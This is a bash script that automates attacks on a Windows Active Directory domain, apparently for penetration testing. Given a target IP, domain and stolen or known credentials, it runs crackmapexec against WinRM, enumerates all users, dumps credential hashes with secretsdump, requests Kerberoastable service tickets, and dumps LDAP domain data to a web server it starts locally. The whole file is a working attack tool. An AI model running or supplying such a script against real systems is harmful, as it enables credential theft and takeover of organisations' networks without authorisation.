#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
ENDCOLOR="\e[0m"

if [ -z $1 ]
then
    echo -e "${RED}[*] Syntax: <IP> <DOMAIN> <USER> <PASSWORD>${ENDCOLOR}"
    exit 1
fi

if [ -z $2 ]
then
    echo -e "${RED}[*] Syntax: <IP> <DOMAIN> <USER> <PASSWORD>${ENDCOLOR}"
    exit 1
fi

if [ -z $3 ]
then
    echo -e "${RED}[*] Syntax: <IP> <DOMAIN> <USER> <PASSWORD>${ENDCOLOR}"
    exit 1
fi

if [ -z $4 ]
then
    echo -e "${RED}[*] Syntax: <IP> <DOMAIN> <USER> <PASSWORD>${ENDCOLOR}"
    exit 1
fi

echo -e "${GREEN}TARGET IP: $1 ${ENDCOLOR}"
echo -e "${GREEN}TARGET DOMAIN: $2 ${ENDCOLOR}"
echo -e "${GREEN}TARGET USER: $3 ${ENDCOLOR}"
echo -e "${GREEN}TARGET PASSWORD: $4 ${ENDCOLOR}\n"

echo -e "${YELLOW}[+] EVIL-WINRM${ENDCOLOR}\n"

crackmapexec winrm $1 -u $3 -p $4 2>/dev/null

echo -e "\n${YELLOW}[+] GetADUSers${ENDCOLOR}\n"

python3 GetADUsers.py -all $2/$3:$4 -dc-ip $1 2>/dev/null

echo -e "\n${YELLOW}[+] SECRETSDUMP${ENDCOLOR}\n"

python3 secretsdump.py $2/$3:$4@$1 2>/dev/null

echo -e "\n${YELLOW}[+] Kerberoasting${ENDCOLOR}\n"

python3 GetUserSPNs.py $2/$3:$4 -request 2>/dev/null

echo -e "\n${YELLOW}[+] LDAPDOMAINDUMP${ENDCOLOR}\n"

mkdir /var/www/html/ldapdomaindump 2>/dev/null
cd /var/www/html/ldapdomaindump && ldapdomaindump -u $2'\'$3 -p $4 -n $1 $1 --no-grep
service apache2 start 2>/dev/null
service nginx start 2>/dev/null
echo -e "\n${GREEN}REPORT${ENDCOLOR}"
echo -e "http://localhost/ldapdomaindump"
echo -e "\nDomain Groups:\nhttp://localhost/ldapdomaindump/domain_groups.html"
echo -e "\nDomain Users:\nhttp://localhost/ldapdomaindump/domain_users.html"
echo -e "\nDomain Computers by OS:\nhttp://localhost/ldapdomaindump/domain_computers_by_os.html"
echo -e "\nDomain Users by Group:\nhttp://localhost/ldapdomaindump/domain_users_by_group.html"
